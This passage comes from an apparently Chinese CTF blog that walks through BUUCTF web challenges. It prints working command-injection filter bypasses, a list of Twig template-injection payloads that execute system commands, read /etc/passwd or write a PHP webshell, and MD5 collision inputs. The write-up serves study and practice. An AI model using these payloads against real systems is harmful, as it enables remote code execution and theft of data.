<p>可以很明显的看到成功的绕过了， <code>intval('2e4')</code>  返回 2， <code>intval('2e4'+1)</code>  返回 20001</p>
<p>这样就绕过了 level1</p>
<p>level2</p>
<p>就很常见了 md5 加密前后都是 0e 开头科学计数法 0=0 就饶过了，就让 md5= <code>0e215962017</code>  就可以了</p>
<p>0e215962017<br>
0e291242476940776845150308577824</p>
<p>level3</p>
<p>既然要获得 flag 至少得知道 flag 的文件名吧，先 ls 查一下目录</p>
<p>构造 payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num=2e4&amp;md5=0e215962017&amp;get_flag=ls</span><br></pre></td></tr></table></figure>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b35.png" alt></p>
<p>好家伙 fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag 这么长。。。</p>
<p>想办法获得 flag，既然 cat 被禁了就 tac，空格被禁了就用 $IFS$1（<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mtext>改成</mtext></mrow><annotation encoding="application/x-tex">1改成</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord cjk_fallback">改</span><span class="mord cjk_fallback">成</span></span></span></span>加其他数字貌似都行）</p>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num=2e4&amp;md5=0e215962017&amp;get_flag=tac$IFS$1fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag</span><br></pre></td></tr></table></figure>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b36.png" alt></p>
<p 42dc02b1-dc77-4b79-877b-25106e29ae8b>flag</p>
<p>注意 tac 不是把所有内容反向输出，而是类似数组那样正常输出数组是顺序输出，tac 的话会从后往前开始输出，kali 本地复现</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b37.png" alt></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b38.png" alt></p>
<p>运行 test.php</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b39.png" alt></p>
<h2 id="bjdctf2020cookie-is-so-stable"><a class="markdownIt-Anchor" href="#bjdctf2020cookie-is-so-stable">#</a> [BJDCTF2020]Cookie is so stable</h2>
<p>看到 Hint 点进去查看页面源代码</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b40.png" alt></p>
<p>那就输入数据抓包查看一下 cookies</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b41.png" alt></p>
<p>尝试 sql 注入失败了，可能是 ssti 注入？</p>
<p>这里记录一下判断模板注入类型的方法，贴一个学习链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/xhy18634297976/article/details/123011238">https://blog.csdn.net/xhy18634297976/article/details/123011238</a></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b42.png" alt></p>
<p>输入 <code>&#123;&#123;7*'7'&#125;&#125;</code>  返回 49 是 Twig 模块，返回 7777777 表示是 Jinja2 模块</p>
<p>那就试试看，看看应该用哪种注入模板</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b43.png" alt></p>
<p>可以看到他返回的是 49，所以本题模板注入是 Twig 注入，找一下注入模板，因为是 Twig 注入，所以是由固定的 payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;id&quot;)&#125;&#125;	//查看id</span><br><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;cat /flag&quot;)&#125;&#125;	//查看flag</span><br></pre></td></tr></table></figure>
<p>在 Cookie 里面输入</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b44.png" alt></p>
<p ee4ffe9e-fb24-4f61-8dc6-98a2b5a0e396>得到 flag，flag</p>
<p>ssti 注入模板贴一个学习链接：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/bmjoker/p/13508538.html">https://www.cnblogs.com/bmjoker/p/13508538.html</a></p>
<p>twig3.x 版本根据官方文档新增了 filter 和 map 等内容，补充一些新版本的 payload 在这里：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;/etc/passwd&#x27;|file_excerpt(1,30)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;app.request.files.get(1).__construct(&#x27;/etc/passwd&#x27;,&#x27;&#x27;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;app.request.files.get(1).openFile.fread(99)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;whoami&quot;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;_self.env.enableDebug()&#125;&#125;&#123;&#123;_self.env.isDebug()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;[&quot;id&quot;]|map(&quot;system&quot;)|join(&quot;,&quot;)</span><br><span class="line"></span><br><span class="line">&#123;&#123;&#123;&quot;&lt;?php phpinfo();&quot;:&quot;/var/www/html/shell.php&quot;&#125;|map(&quot;file_put_contents&quot;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;[&quot;id&quot;,0]|sort(&quot;system&quot;)|join(&quot;,&quot;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;[&quot;id&quot;]|filter(&quot;system&quot;)|join(&quot;,&quot;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;[0,0]|reduce(&quot;system&quot;,&quot;id&quot;)|join(&quot;,&quot;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;[&#x27;cat /etc/passwd&#x27;]|filter(&#x27;system&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>
<h2 id="安洵杯-2019easy_web"><a class="markdownIt-Anchor" href="#安洵杯-2019easy_web">#</a> [安洵杯 2019] easy_web</h2>
<p>查看源码能获得到的信息只有一个 md5 is funny，那很明显本题和 md5 有关，看到 url 里 img 的参数后面的值就很想把他解码了</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b45.png" alt></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b46.png" alt></p>
<p>两次 base64 解码得到 <code>3535352e706e67</code></p>
<p>16 进制转字符串得到 <code>555.png</code> ，知道他回显文件的方法，可以逆向思维，尝试访问 index.php 先转 16 进制再 base64 加密两次</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">index.php</span><br><span class="line">696e6465782e706870	//16</span><br><span class="line">Njk2ZTY0NjU3ODJlNzA2ODcw	//一次base64</span><br><span class="line">TmprMlpUWTBOalUzT0RKbE56QTJPRGN3	//两次base64</span><br></pre></td></tr></table></figure>
<p>访问 index.php</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?img=TmprMlpUWTBOalUzT0RKbE56QTJPRGN3&amp;cmd=</span><br></pre></td></tr></table></figure>
<p>f12 查看页面源代码，可以看到一串 base64，解码看看是不是源码</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b47.png" alt></p>
<p>解码得到源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL || ~ E_NOTICE);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>])) </span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">hex2bin</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img&#x27;</span>])));</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[^a-zA-Z0-9.]+/&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;xixi～ no flag&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$txt</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;data:image/gif;base64,&quot;</span> . <span class="variable">$txt</span> . <span class="string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$cmd</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;forbid ~&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] !== (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> `<span class="variable">$cmd</span>`;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&quot;md5 is funny ~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>代码审计，最重要的是这一段</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;forbid ~&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] !== (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> `<span class="variable">$cmd</span>`;	<span class="comment">//将cmd当作系统命令执行并输出</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&quot;md5 is funny ~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>preg_match</code>  的话可以使用 <code>\</code>  绕过， <code>l\s</code>  效果等同于 <code>ls</code></p>
<p>md5 原本可以使用数组绕过的，但是被强制转换了，可以用相面两个数据来绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2</span><br><span class="line">&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br></pre></td></tr></table></figure>
<p>md5 的绕过可以用 fastcoll 来生成，具体内容和下载可以看这篇文章：<a target="_blank" rel="noopener" href="https://www.zeroplace.cn/article.asp?id=886%EF%BC%8C%E4%BD%86%E6%98%AF%E8%BF%99%E4%B8%AA%E5%B7%A5%E5%85%B7%E7%94%9F%E6%88%90%E7%9A%84url%E7%BC%96%E7%A0%81%E5%BE%88%E5%AE%B9%E6%98%93%E5%87%BA%E7%8E%B0%E9%BB%91%E5%90%8D%E5%8D%95%E7%9A%84%E5%AD%97%E7%AC%A6%EF%BC%8C%E6%89%80%E4%BB%A5%E5%B0%B1%E7%94%A8%E8%BF%99%E4%B8%AA%E5%88%AB%E7%9A%84%E5%B8%88%E5%82%85%E7%9A%84payload">https://www.zeroplace.cn/article.asp?id=886，但是这个工具生成的 url 编码很容易出现黑名单的字符，所以就用这个别的师傅的 payload</a></p>
<p>bp 抓包 repeater</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET</span><br><span class="line">?img=&amp;cmd=dir</span><br><span class="line">POST</span><br><span class="line">a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br></pre></td></tr></table></figure>
<p>如果使用 hackbar post 抓包的话要在 bp 里面再次修改 post 内容，post 的内容会被再次编码，导致无法绕过。因为 ls 被禁用了，这里使用 dir，也可以使用 l\s，效果是一样的</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/c01.png" alt></p>
<p>可以看得到了 <code>555.png</code> ， <code>bj.png</code> ， <code>ctf3.jpeg</code> ， <code>index.php</code> ，发现该目录是没有 flag 相关文件的，所以访问上一级，使用 <code>dir \</code>  或者 <code>ls \</code>  访问上一级，<strong>在 burp 中如果使用空格会被识别为其他的参数，所以这里空格用 <code>%20</code>  替换</strong>，ls 要用 <code>\</code>  隔开</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?img=&amp;cmd=l\s%20/</span><br></pre></td></tr></table></figure>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/c02.png" alt></p>
<p>读取 flag， <code>cat \flag</code>  加入反斜杠 <code>ca\t%20/f\l\a\g</code></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/c03.png" alt></p>
<p dfa4fed1-7091-49d6-af5d-dad4497448e3>flag</p>
<h2 id="mrctf2020ezpop"><a class="markdownIt-Anchor" href="#mrctf2020ezpop">#</a> [MRCTF2020]Ezpop</h2>
<p>这里重新记录一下反序列化的几个魔术方法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__destruct(类执行完毕以后调用，其最主要的作用是拿来做垃圾回收机制。)</span><br><span class="line">__construct(类一执行就开始调用，其作用是拿来初始化一些值。)</span><br><span class="line">__toString(在对象当做字符串的时候会被调用。)</span><br><span class="line">__wakeup(该魔术方法在反序列化的时候自动调用，为反序列化生成的对象做一些初始化操作)</span><br><span class="line">__sleep(在对象被序列化的过程中自动调用。sleep要加数组)</span><br><span class="line">__invoke(当尝试以调用函数的方式调用一个对象时，方法会被自动调用)</span><br><span class="line">__get(当访问类中的私有属性或者是不存在的属性，触发__get魔术方法)</span><br><span class="line">__set(在对象访问私有成员的时候自动被调用，达到了给你看，但是不能给你修改的效果！在对象访问一个私有的成员的时候就会自动的调用该魔术方法)</span><br><span class="line">__call(当所调用的成员方法不存在（或者没有权限）该类时调用，用于对错误后做一些操作或者提示信息)</span><br><span class="line">__isset(方法用于检测私有属性值是否被设定。当外部使用isset读类内部进行检测对象是否有具有某个私有成员的时候就会被自动调用！)</span><br><span class="line">__unset(方法用于删除私有属性。在外部调用类内部的私有成员的时候就会自动的调用__unset魔术方法)</span><br></pre></td></tr></table></figure>
<p>查看代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="comment">//WTF IS THIS?</span></span><br><span class="line"><span class="comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span></span><br><span class="line"><span class="comment">//And Crack It!</span></span><br><span class="line"><span class="class"><span 